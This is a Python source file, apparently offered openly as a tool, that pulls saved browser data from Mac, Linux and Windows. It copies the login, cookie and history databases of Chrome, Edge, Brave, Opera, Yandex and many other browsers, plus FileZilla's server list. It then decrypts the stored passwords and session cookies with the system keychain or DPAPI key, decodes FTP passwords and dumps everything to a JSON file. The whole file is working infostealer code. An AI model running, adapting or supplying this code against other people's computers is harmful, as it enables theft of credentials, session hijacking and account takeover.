""" Get unencrypted 'Saved Password' from Google Chrome
    Supported platform: Mac, Linux and Windows
"""
__author__ = "Priyank Chheda"
__email__  = "p.chheda29@gmail.com"

from rich                import print
from json                import load, dumps
from string              import printable
from getpass             import getuser
from os                  import listdir
from sqlite3             import connect
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Cipher       import AES
from base64              import b64decode

def get_file_path(full_path):
    return "/".join(full_path.split("/")[:-1]) + "/"

def file2tmp(file, tmp_dir, file_name):
    from os.path import exists, isfile
    from pathlib import Path
    from shutil  import copy2

    if not exists(get_file_path(file)):
        return None

    if not isfile(file):
        return None

    tmp_file = f"{tmp_dir}/{file_name}".replace(" ", "")
    Path(get_file_path(tmp_file)).mkdir(parents=True, exist_ok=True)
    copy2(file, tmp_file)

    return True

class ChromeMac:
    def __init__(self, tmp_dir):
        self.browser_paths = {
            "GoogleChrome" : f"/Users/{getuser()}/Library/Application Support/Google/Chrome",

            "Filezilla"    : f"/Users/{getuser()}/Library/Application Support/filezilla"
        }

        for app, path in self.browser_paths.items():
            browser = f"{path}/Default"

            file2tmp(f"{browser}/Login Data",     tmp_dir, f"{app}_Login.sql")
            file2tmp(f"{browser}/Cookies",        tmp_dir, f"{app}_Cookies.sql")
            file2tmp(f"{browser}/History",        tmp_dir, f"{app}_History.sql")
            file2tmp(f"{path}/recentservers.xml", tmp_dir, f"{app}_FTP.xml")

        self.master_key = self.get_key()

    def get_key(self):
        from subprocess import Popen, PIPE

        my_pass = Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout = PIPE,
            stderr = PIPE,
            shell  = True,
        )
        stdout, _ = my_pass.communicate()
        my_pass   = stdout.replace(b"\n", b"")

        iterations = 1003
        salt       = b"saltysalt"
        length     = 16

        return PBKDF2(my_pass, salt, length, iterations)

    def decrypt_func(self, enc_passwd, browser_name):
        initialization_vector = b" " * 16
        enc_passwd = enc_passwd[3:]
        cipher     = AES.new(self.master_key, AES.MODE_CBC, IV=initialization_vector)
        decrypted  = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode("utf8")

class ChromeWin:
    def __init__(self, tmp_dir):
        from os import getenv

        self.browser_paths = {
            "7Star"              : f"{getenv('LOCALAPPDATA')}\\7Star\\7Star\\User Data",
            "Amigo"              : f"{getenv('LOCALAPPDATA')}\\Amigo\\User Data",
            "Brave"              : f"{getenv('LOCALAPPDATA')}\\BraveSoftware\\Brave-Browser\\User Data",
            "Centbrowser"        : f"{getenv('LOCALAPPDATA')}\\CentBrowser\\User Data",
            "Chedot"             : f"{getenv('LOCALAPPDATA')}\\Chedot\\User Data",
            "ChromeCanar"        : f"{getenv('LOCALAPPDATA')}\\Google\\Chrome SxS\\User Data",
            "Chromium"           : f"{getenv('LOCALAPPDATA')}\\Chromium\\User Data",
            "ChromiumEdge"       : f"{getenv('LOCALAPPDATA')}\\Microsoft\\Edge\\User Data",
            "Coccoc"             : f"{getenv('LOCALAPPDATA')}\\CocCoc\\Browser\\User Data",
            "ElementsBrowse"     : f"{getenv('LOCALAPPDATA')}\\Elements Browser\\User Data",
            "EpicPrivacyBrowser" : f"{getenv('LOCALAPPDATA')}\\Epic Privacy Browser\\User Data",
            "GoogleChrom"        : f"{getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data",
            "Kometa"             : f"{getenv('LOCALAPPDATA')}\\Kometa\\User Data",
            "Opera"              : f"{getenv('LOCALAPPDATA')}\\Opera Software\\Opera Stable",
            "Orbitum"            : f"{getenv('LOCALAPPDATA')}\\Orbitum\\User Data",
            "Sputnik"            : f"{getenv('LOCALAPPDATA')}\\Sputnik\\Sputnik\\User Data",
            "Torch"              : f"{getenv('LOCALAPPDATA')}\\Torch\\User Data",
            "Uran"               : f"{getenv('LOCALAPPDATA')}\\uCozMedia\\Uran\\User Data",
            "Vivaldi"            : f"{getenv('LOCALAPPDATA')}\\Vivaldi\\User Data",
            "YandexBrowser"      : f"{getenv('LOCALAPPDATA')}\\Yandex\\YandexBrowser\\User Data",

            "Filezilla"          : f"{getenv('APPDATA')}\\FileZilla"
        }

        for app, path in self.browser_paths.items():
            browser = f"{path}\\Default"

            file2tmp(f"{browser}\\Login Data",     tmp_dir, f"{app}_Login.sql")
            file2tmp(f"{browser}\\Cookies",        tmp_dir, f"{app}_Cookies.sql")
            file2tmp(f"{browser}\\History",        tmp_dir, f"{app}_History.sql")
            file2tmp(f"{path}\\recentservers.xml", tmp_dir, f"{app}_FTP.xml")

    def get_key(self, browser_name):
        from win32crypt import CryptUnprotectData

        master_key = None
        with open(f"{self.browser_paths[browser_name]}\\Local State") as f:
            try:
                master_key = CryptUnprotectData(
                    b64decode(load(f)["os_crypt"]["encrypted_key"])[5:],
                    None,
                    None,
                    None,
                    0,
                )[1]
            except Exception:
                master_key = None

        return master_key

    def decrypt_func(self, enc_passwd, browser_name):
        from io         import BytesIO
        from win32crypt import CryptUnprotectData

        password_buffer = BytesIO(enc_passwd)
        reader = password_buffer.read

        if reader(3) != b"v10":
            data = CryptUnprotectData(enc_passwd, None, None, None, 0)
            return data[1].decode("utf8")
        else:
            browser_key = self.get_key(browser_name)

            if not browser_key:
                return ""

            iv      = reader(12)
            secrets = reader()

            decryptor = AES.new(browser_key, AES.MODE_GCM, iv)

            return decryptor.decrypt(secrets)[:-16].decode("utf8")

class ChromeLinux:
    def __init__(self, tmp_dir):
        self.browser_paths = {
            "GoogleChrome"       : f"/home/{getuser()}/.config/google-chrome",
            "Chromium"           : f"/home/{getuser()}/.config/chromium",
            "Brave"              : f"/home/{getuser()}/.config/BraveSoftware/Brave-Browser",
            "SlimJet"            : f"/home/{getuser()}/.config/slimjet",
            "DissenterBrowser"   : f"/home/{getuser()}/.config/GabAI/Dissenter-Browser",
            "Vivaldi"            : f"/home/{getuser()}/.config/vivaldi",
            "MicrosoftEdge_Dev"  : f"/home/{getuser()}/.config/microsoft-edge-dev",
            "MicrosoftEdge_Beta" : f"/home/{getuser()}/.config/microsoft-edge-beta",
            "MicrosoftEdge"      : f"/home/{getuser()}/.config/microsoft-edge",
            "Opera"              : f"/home/{getuser()}/.config/opera",
            "YandexBrowser"      : f"/home/{getuser()}/.config/yandex/YandexBrowser", # ! ?

            "Filezilla"          : f"/home/{getuser()}/.config/filezilla"
        }

        for app, path in self.browser_paths.items():
            browser = f"{path}/Default"

            if app.lower() in ("opera"):
                browser = browser.replace("/Default", "")

            file2tmp(f"{browser}/Login Data",     tmp_dir, f"{app}_Login.sql")
            file2tmp(f"{browser}/Cookies",        tmp_dir, f"{app}_Cookies.sql")
            file2tmp(f"{browser}/History",        tmp_dir, f"{app}_History.sql")
            file2tmp(f"{path}/recentservers.xml", tmp_dir, f"{app}_FTP.xml")

        self.master_key = self.get_key()

    def get_key(self):
        from secretstorage import dbus_init, get_default_collection

        bus        = dbus_init()
        collection = get_default_collection(bus)
        my_pass    = next(
            (
                item.get_secret()
                for item in collection.get_all_items()
                if item.get_label() == "Chrome Safe Storage"
            ),
            "peanuts".encode("utf8"),
        )

        iterations = 1
        salt       = b"saltysalt"
        length     = 16

        return PBKDF2(my_pass, salt, length, iterations)

    def decrypt_func(self, enc_passwd, browser_name):
        initialization_vector = b" " * 16
        enc_passwd = enc_passwd[3:]
        cipher     = AES.new(self.master_key, AES.MODE_CBC, IV=initialization_vector)
        decrypted  = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode("utf8")


class Chrome:
    def __init__(self, tmp_dir="tmp"):
        from platform import system

        target_os = system()
        if target_os == "Darwin":
            self.chrome_os = ChromeMac(tmp_dir)
        elif target_os == "Windows":
            self.chrome_os = ChromeWin(tmp_dir)
        elif target_os == "Linux":
            self.chrome_os = ChromeLinux(tmp_dir)

        self.tmp_dir       = tmp_dir
        self.login_dbs     = []
        self.cookies_dbs   = []
        self.history_dbs   = []
        self.downloads_dbs = []
        self.ftp_dbs       = []

    def get_password(self):
        try:
            self.login_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_Login.sql")}
        except Exception:
            return {}

        data = {}

        for login_sql in self.login_dbs:
            browser_name = login_sql.split("_Login.sql")[0]
            data[browser_name] = []

            conn   = connect(f"{self.tmp_dir}/{login_sql}")
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT signon_realm, username_value, password_value
                FROM logins;
                """
            )

            for result in cursor.fetchall():

                _pass = self.chrome_os.decrypt_func(result[2], browser_name)

                if not _pass:
                    continue

                passwd = "".join(i for i in _pass if i in printable)
                if not passwd:
                    continue

                data[browser_name].append({
                    "url"      : result[0],
                    "username" : result[1],
                    "password" : passwd
                })

            conn.close()

        return data

    def get_cookies(self):
        try:
            self.cookies_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_Cookies.sql")}
        except Exception:
            return {}

        data = {}

        for cookies_sql in self.cookies_dbs:
            browser_name = cookies_sql.split("_Cookies.sql")[0]
            data[browser_name] = {}

            conn   = connect(f"{self.tmp_dir}/{cookies_sql}")
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT host_key, name, encrypted_value
                FROM cookies;
                """
            )

            for result in cursor.fetchall():

                try:
                    _cookie = self.chrome_os.decrypt_func(result[2], browser_name)
                except Exception:
                    continue

                if not _cookie:
                    continue

                cookie = "".join(i for i in _cookie if i in printable)
                if not cookie:
                    continue

                host_key = result[0]
                name     = result[1]
                if host_key not in data[browser_name].keys():
                    data[browser_name][host_key] = {}

                data[browser_name][host_key][name] =  cookie

            conn.close()

        return data

    def get_history(self):
        try:
            self.history_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_History.sql")}
        except Exception:
            return {}

        data = {}

        for history_sql in self.history_dbs:
            browser_name = history_sql.split("_History.sql")[0]
            data[browser_name] = []

            conn   = connect(f"{self.tmp_dir}/{history_sql}")
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT title, url
                FROM urls;
                """
            )

            for result in cursor.fetchall():
                title = "".join(i for i in result[0] if i in printable)
                if not title:
                    continue

                data[browser_name].append({
                    "title" : title,
                    "url"   : result[1]
                })

            conn.close()

        return data

    def get_downloads(self):
        try:
            self.downloads_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_History.sql")}
        except Exception:
            return {}

        data = {}

        for history_sql in self.downloads_dbs:
            browser_name = history_sql.split("_History.sql")[0]
            data[browser_name] = []

            conn   = connect(f"{self.tmp_dir}/{history_sql}")
            cursor = conn.cursor()
            cursor.execute(
                """
                SELECT current_path, tab_url
                FROM downloads;
                """
            )

            for result in cursor.fetchall():
                url = "".join(i for i in result[1] if i in printable)
                if not url:
                    continue

                data[browser_name].append({
                    "url"  : url,
                    "path" : result[0]
                })

            conn.close()

        return data

    def get_ftp(self):
        from lxml import etree

        try:
            self.ftp_dbs = {file for file in listdir(self.tmp_dir) if file.endswith("_FTP.xml")}
        except Exception:
            return {}

        data = []

        for filezilla_xml in self.ftp_dbs:
            xml_root = etree.parse(f"{self.tmp_dir}/{filezilla_xml}").getroot()

            for i in range(len(xml_root[0])):
                try:
                    data.append({
                        "host"     : xml_root[0][i][0].text,
                        "port"     : xml_root[0][i][1].text,
                        "user"     : xml_root[0][i][4].text,
                        "password" : b64decode(xml_root[0][i][5].text).decode('utf-8')
                    })
                except Exception:
                    pass

        return data

    def data_save(self):
        with open(f"{getuser()}_Chrome.json", "w+", encoding="utf-8") as f:
            f.write(dumps({
                "passwords" : self.get_password(),
                "cookies"   : self.get_cookies(),
                "history"   : self.get_history(),
                "downloads" : self.get_downloads(),
                "ftp"       : self.get_ftp()
            }, indent=2, ensure_ascii=False, sort_keys=False))

    def delete_temp(self):
        from shutil import rmtree

        try:
            rmtree(self.tmp_dir)
        except Exception:
            pass


def main():
    """ Operational Script """
    chrome_pwd = Chrome()


    chrome_pwd.data_save()

    print(chrome_pwd.get_password())
    print(f"[green]{getuser()}'s [yellow]» {' - '.join(chrome_pwd.login_dbs)} «[/] Data")

    print()

    print(chrome_pwd.get_cookies())
    print(f"[green]{getuser()}'s [yellow]» {' - '.join(chrome_pwd.cookies_dbs)} «[/] Data")

    print()

    print(chrome_pwd.get_history())
    print(f"[green]{getuser()}'s [yellow]» {' - '.join(chrome_pwd.history_dbs)} «[/] Data")

    print()

    print(chrome_pwd.get_downloads())
    print(f"[green]{getuser()}'s [yellow]» {' - '.join(chrome_pwd.downloads_dbs)} «[/] Data")

    print()

    print(chrome_pwd.get_ftp())
    print(f"[green]{getuser()}'s [yellow]» {' - '.join(chrome_pwd.ftp_dbs)} «[/] Data")


if __name__ == '__main__':
    main()
